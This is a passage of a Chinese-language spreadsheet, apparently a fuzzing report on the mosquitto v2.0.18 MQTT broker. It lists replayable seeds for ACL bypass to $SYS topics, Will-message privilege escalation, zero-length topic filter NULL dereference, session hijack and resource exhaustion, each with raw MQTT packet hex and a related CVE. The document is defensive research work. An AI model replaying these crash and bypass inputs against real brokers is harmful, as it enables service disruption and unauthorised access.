        <f>== 种子标识: id:000007,sev:3,cat:0306 ===\u000a大小: 976B (报告+请求数据)\u000a请求数据: 311B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(311B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1b0100\u000aMsg[2]: CONNECT Proto=MQTT v21 ClientID=''(7540B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545415c6003c001d7421\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: SUBSCRIBE PacketID=10 Topics=['a/b/c/d/e/f/g/h/i/j'(QoS=0)] | raw_header=8218000a0013612f622f632f642f652f\u000aMsg[5]: (不完整,193B) raw=30ff9970707070707070707070707070707070707070203e0a7373737769816c2f756f725f758f31\u000a(尾部193B): 30ff9970707070707070707070707070707070707070203e0a7373737769816c2f756f725f758f312f2370106c7d7f279f4b</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J44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4">
      <c r="A444" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B444" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C444" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0386)中的REQUEST DATA提取出来(189B)\u000a4.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444" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0386 ===\u000a大小: 1167B (报告+请求数据)\u000a请求数据: 189B\u000a\u000a---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MQTT请求序列(189B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=47B | raw_header=35440013245359532f62726f6b65722f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=83B | raw_header=34680013245359532f62726f6b65722f\u000aMsg[4]: (不完整,11B) raw=40232425dd0a77696c6c2f\u000a(尾部11B): 40232425dd0a77696c6c2f</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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5">
      <c r="A445" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B445" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C445" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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445" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 608B (报告+请求数据)\u000a请求数据: 66B\u000a\u000a---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MQTT请求序列(66B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=4 | raw_header=650c00044d51545404020d3e0000\u000aMsg[2]: SUBSCRIBE PacketID=8448 Topics=[''(零长度!QoS=2)] | raw_header=800921000000760a019200\u000aMsg[3]: TYPE0  | raw_header=00100001330c00020d5700008209692f\u000aMsg[4]: SUBSCRIBE PacketID=11 Topics=[] | raw_header=820a000b2f2b019205fffb00\u000aMsg[5]: (不完整,11B) raw=012358024f8458024f84e0\u000a(尾部11B): 012358024f8458024f84e0</f>
        <v/>
      </c>
      <c r="F4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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J44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4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6">
      <c r="A446" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B446" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C446" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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46" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 924B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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TYPE0  | raw_header=0300\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: SUBSCRIBE PacketID=14 Topics=[''(零长度!QoS=3)] | raw_header=821a000e00000b73656e736f722f7465\u000aMsg[4]: PUBLISH Topic='$share/grp1/test/+' QoS=1 retain=True payload_len=127B | raw_header=3b930100122473686172652f67727031\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: TYPE0  | raw_header=00020000\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: (不完整,2B) raw=000a\u000a(尾部2B): 000a</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J4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7">
      <c r="A447" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B447" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C447" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:0140)中的REQUEST DATA提取出来(26B)\u000a4.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47" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0140 ===\u000a大小: 554B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(26B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=10 Topics=[''(零长度!QoS=2)] | raw_header=8218000a000006746573742f2301320f</f>
        <v/>
      </c>
      <c r="F4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47" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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4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48">
      <c r="A448" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B448" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C448" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:0142)中的REQUEST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48" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0142 ===\u000a大小: 859B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MQTT请求序列(169B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3651 Topics=[''(零长度!QoS=2)] | raw_header=82050e43000002\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=42B | raw_header=3449001d245359532f62726f6b65722f\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=ef5500044d51545404c6003c001d7465</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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49">
      <c r="A449" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B449" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C449" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:01c0)中的REQUEST DATA提取出来(126B)\u000a4.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449" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:01c0 ===\u000a大小: 842B (报告+请求数据)\u000a请求数据: 126B\u000a\u000a---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MQTT请求序列(126B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1551 Topics=[''(零长度!QoS=3)] | raw_header=8211060f00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='t' QoS=0 retain=True payload_len=101B | raw_header=31680001743d0800152473686172652f\u000aMsg[3]: UNSUBSCRIBE  | raw_header=ac</f>
        <v/>
      </c>
      <c r="F4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49" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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4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50">
      <c r="A450" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B450" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C450" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:01c2)中的REQUEST DATA提取出来(102B)\u000a4.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450" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:01c2 ===\u000a大小: 975B (报告+请求数据)\u000a请求数据: 102B\u000a\u000a---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MQTT请求序列(102B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=219 Topics=[''(零长度!QoS=1), '$share/grp/test/topic'(QoS=1), 'test/topic'(QoS=2)] | raw_header=822a00db00000100152473686172652f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload='\x00ÜÄ-`\x17Ð\x00ñºÅ¼ÕfCxV\x8e½äZH' | raw_header=3535001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=6e4603\u000a(尾部3B): 6e4603</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J45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5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51">
      <c r="A451" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B451" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C451" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:0344)中的REQUEST DATA提取出来(201B)\u000a4.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51" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0344 ===\u000a大小: 904B (报告+请求数据)\u000a请求数据: 201B\u000a\u000a---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MQTT请求序列(201B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: SUBSCRIBE PacketID=10 Topics=[''(零长度!QoS=0)] | raw_header=8218000a00000010002b00008218000a\u000aMsg[3]: PUBACK PacketID=10038 | raw_header=4e0e27362600062b2f64617461002b76\u000aMsg[4]: PUBREL PacketID=31023 | raw_header=6572792f646565702f746f7069632f6c\u000aMsg[5]: TYPE0  | raw_header=00142473686172652f677270322f7365\u000aMsg[6]: TYPE0  | raw_header=000123\u000aMsg[7]: (不完整,16B) raw=8c4a0f7069633d612f001023632f642f\u000a(尾部16B): 8c4a0f7069633d612f001023632f642f</f>
        <v/>
      </c>
      <c r="F4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51" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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5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52">
      <c r="A452" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B452" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C452" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:4,cat:03c4)中的REQUEST DATA提取出来(76B)\u000a4.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52" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:03c4 ===\u000a大小: 971B (报告+请求数据)\u000a请求数据: 76B\u000a\u000a---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MQTT请求序列(76B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=309 Topics=[''(零长度!QoS=0)] | raw_header=82050135000000\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload_len=53B | raw_header=3b42000b73656e736f722f74656d7001\u000aMsg[3]: PUBLISH  | raw_header=3f</f>
        <v/>
      </c>
      <c r="F4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5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52" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J45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5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53">
      <c r="A453" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B453" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C453" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(614B)\u000a4.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53" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 939B (报告+请求数据)\u000a请求数据: 614B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(614B原始二进制) ---\u000aMsg[1]: SUBSCRIBE  | raw_header=8201e6\u000aMsg[2]: PUBREL  | raw_header=6700\u000aMsg[3]: TYPE0  | raw_header=012300001224962f62726f6b65527f76\u000aMsg[4]: CONNACK session_present=101 reason_code=118 | raw_header=2f6c6576656c312f6c6576656c322f6c\u000aMsg[5]: SUBSCRIBE PacketID=225 Topics=['$SYS/broker/version'(QoS=2), '$share/grp1/#'(QoS=0)] | raw_header=822800e10013245359532f62726f6b65\u000aMsg[6]: PUBLISH Topic='$SYS/br^^^^Z^^^^^y^ÿ\x7fÿÿ\x0e\x05ÿÿ\x05\x7f' QoS=1 retain=False payload_len=54B | raw_header=3255001d245359532f62725e5e5e5e5a\u000aMsg[7]: PUBREC PacketID=24158 | raw_header=5e625e5e5e5e5e5e5e5e5e5e5e5e5e46\u000aMsg[8]: PUBREC PacketID=24158 | raw_header=5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e\u000aMsg[9]: PUBREC PacketID=24414 | raw_header=5e5e5f5e5e5e5e5e5e5e5e5e5e5e5e5e\u000aMsg[10]: (不完整,41B) raw=5e5e5e5e5e7fff5e5e5e5e5e5e5eff5e5e5e5e5e5e795e5e5e5e5e5e5e5e5e5e7fff5e5e5e635e5e\u000a(尾部41B): 5e5e5e5e5e7fff5e5e5e5e5e5e5eff5e5e5e5e5e5e795e5e5e5e5e5e5e5e5e5e7fff5e5e5e635e5e5e</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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5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54">
      <c r="A454" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B454" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C454" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(725B)\u000a4.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54" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 1257B (报告+请求数据)\u000a请求数据: 725B\u000a\u000a---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MQTT请求序列(725B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=357273696e00022d23993c000766757a\u000aMsg[2]: SUBSCRIBE  | raw_header=8e018e\u000aMsg[3]: (不完整,606B) raw=8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e2b2f2b01a205000c000123821303d8000000000b73656e\u000a(尾部606B): 8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e2b2f2b01a205000c000123821303d8000000000b73656e736f722f74656d70003c</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J45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5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55">
      <c r="A455" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B455" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C455" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(295B)\u000a4.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455" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 871B (报告+请求数据)\u000a请求数据: 295B\u000a\u000a---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MQTT请求序列(295B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=24262626262626262626262626262626\u000aMsg[4]: CONNECT  | raw_header=1000\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262600010006746573\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=220a26262626262626262626\u000aMsg[9]: CONNACK session_present=15 reason_code=38 | raw_header=26260f26262626262626262626262626\u000aMsg[10]: PUBREC  | raw_header=50</f>
        <v/>
      </c>
      <c r="F4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5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55" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J45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455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56">
      <c r="A456" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B456" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C456" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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0x0101\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E456" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 756B (报告+请求数据)\u000a请求数据: 42B\u000a\u000a---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CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(42B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=100c00044d5154540480003c0000\u000aMsg[2]: SUBSCRIBE PacketID=127 Topics=[] | raw_header=8218007f16ffffffff00000000000000\u000aMsg[3]: CONNECT  | raw_header=1580</f>
        <v/>
      </c>
      <c r="F4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5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56" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J45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5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57">
      <c r="A457" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B457" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C457" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(187B)\u000a4.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57" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0102 ===\u000a大小: 700B (报告+请求数据)\u000a请求数据: 187B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(187B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=41 Topics=[] | raw_header=825e0029130bb2c1f011260000000961\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=67B | raw_header=38580013245359532f62726f6b65722f\u000aMsg[3]: PUBREL  | raw_header=6a</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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5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58">
      <c r="A458" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B458" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C458" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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458" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0103 ===\u000a大小: 986B (报告+请求数据)\u000a请求数据: 155B\u000a\u000a---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MQTT请求序列(155B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v114 ClientID=''(0B) clean_session=False keepalive=25455s Will=YES [持久会话] | raw_header=105500044d5154547265636f00000000\u000aMsg[2]: (不完整,68B) raw=696f6e013c2e000d2473686172862f677270312f230380e80ec682c53658971b49ffb66fefbdd280\u000a(尾部68B): 696f6e013c2e000d2473686172862f677270312f230380e80ec682c53658971b49ffb66fefbdd280319fa4d8447ee9ce08a5</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J45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5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59">
      <c r="A459" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B459" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C459" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(119B)\u000a4.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59" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0182 ===\u000a大小: 1717B (报告+请求数据)\u000a请求数据: 119B\u000a\u000a---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MQTT请求序列(119B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4916 Topics=['$share/grp2/sensor/#'(QoS=2), '#'(QoS=2)] | raw_header=821d133400142473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=64B | raw_header=35550013245359532f62726f6b65722f\u000aMsg[3]: SUBACK  | raw_header=91</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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5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0">
      <c r="A460" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:01c0</t>
        </is>
      </c>
      <c r="B460" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C460" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:3,cat:01c0)中的REQUEST DATA提取出来(935B)\u000a4.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460" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:01c0 ===\u000a大小: 1468B (报告+请求数据)\u000a请求数据: 935B\u000a\u000a---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MQTT请求序列(935B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=f42626262626262626262626262626ff\u000aMsg[2]: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(不完整,15B) raw=26262626262626262626262626febe\u000a(尾部15B): 26262626262626262626262626febe</f>
        <v/>
      </c>
      <c r="F4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0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60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60" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J460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46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61">
      <c r="A461" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B461" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C461" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(722B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E461" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 1883B (报告+请求数据)\u000a请求数据: 722B\u000a\u000a---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MQTT请求序列(722B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=29545 | raw_header=657273696f6e00022d2399fa08001224\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323216323232323232\u000aMsg[6]: TYPE0  | raw_header=0100\u000aMsg[7]: TYPE0  | raw_header=0d73656e7388722f2b2f744532323232\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[9]: CONNACK session_present=111 reason_code=111 | raw_header=2f726f6f6d312f74656d7032322e3562\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323270700030\u000aMsg[11]: (不完整,59B) raw=6c696768742f6f70003017001173836e736f722f726f6f6d312f74656d7032322e35620200053211\u000a(尾部59B): 6c696768742f6f70003017001173836e736f722f726f6f6d312f74656d7032322e35620200053211000c636d642f6c696768</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J46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6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2">
      <c r="A462" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B462" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C462" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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62" s="2">
